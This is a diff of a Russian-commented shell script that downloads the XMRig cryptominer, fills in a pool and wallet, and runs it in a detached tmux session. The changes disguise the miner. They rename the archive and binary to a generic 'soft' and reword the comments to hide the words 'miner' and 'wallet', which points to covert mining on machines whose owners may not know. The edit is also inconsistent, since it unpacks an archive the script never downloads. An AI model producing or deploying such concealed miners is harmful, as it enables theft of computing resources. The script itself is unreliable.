@@ -22,22 +22,22 @@ cd "$folder_name" || exit
 
 # 4. Скачиваем и распаковываем майнер
 wget https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz
-tar -xzf xmrig-6.25.0-linux-static-x64.tar.gz
-rm xmrig-6.25.0-linux-static-x64.tar.gz
+tar -xzf soft-6.25.0.tar.gz
+rm soft-6.25.0.tar.gz
 
 # 5. Переименовываем папку в имя воркера и заходим в неё
-mv xmrig-6.25.0 "$folder_name"
+mv soft-6.25.0 "$folder_name"
 cd "$folder_name" || exit
 
 # 6. Переименовываем исполняемый файл
-mv xmrig "$folder_name"
+mv soft "$folder_name"
 
 # 7. Скачиваем конфиг (замени ссылку на свою реальную)
 # wget https://raw.githubusercontent.com/твой_путь/config.json
 echo "Ожидаю наличие config.json в папке..."
 
 # 8. Замена данных в JSON
-# Меняем url, user (кошелек) и pass (имя воркера)
+# Меняем url, user и pass (имя программы)
 if [ -f "config.json" ]; then
     sed -i "s/\"url\": \".*\"/\"url\": \"$url_pool1\"/" config.json
     sed -i "s/\"user\": \".*\"/\"user\": \"$wallet\"/" config.json
@@ -54,7 +54,7 @@ chmod +x tmux-linux-x86_64
 # 10. ЗАПУСК
 # -d (detached) — запустить в фоне
 # -s — имя сессии (равно имени воркера)
-# Внутри сессии: переходим в папку с майнером и запускаем его через ./имя_воркера
+# Внутри сессии: переходим в папку с программой и запускаем его через ./имя_программы
 
 ./tmux-linux-x86_64 new-session -d -s "$folder_name" "cd $folder_name && ./$folder_name -c config.json"
 
